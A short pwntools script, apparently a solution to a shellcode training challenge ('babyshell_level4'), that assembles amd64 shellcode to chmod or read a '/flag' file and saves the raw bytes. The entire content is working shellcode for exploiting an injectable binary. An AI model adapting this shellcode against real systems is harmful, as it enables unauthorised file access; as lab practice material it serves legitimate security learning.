# from  pwn import *
# context.arch = "amd64"
# context.terminal = ['multixterm', '-e']  # Attempting to use multixterm

# my_sc = asm(shellcraft.cat("/flag"))
# # display the bytes
# print(disasm(my_sc))
# fd = open("ttt-raw","wb+")
# fd.write(my_sc)
# fd.close()
# #p = gdb.debug("/challenge/babyshell_level4")
# #p.send(my_sc)
# #p.interactive()

from pwn import *
context.arch = "amd64"
context.terminal = ['multixterm', '-e']  # Attempting to use multixterm

my_sc = asm('''
            mov qword ptr[rsp], 0x67616c66
            push rsp
            pop rdi
            mov al, 0x5a
            mov sil, 0xff
            syscall
''')
# display the bytes
print(disasm(my_sc))
print("len: %d",len(my_sc))
fd = open("ttt-raw","wb+")
fd.write(my_sc)
fd.close()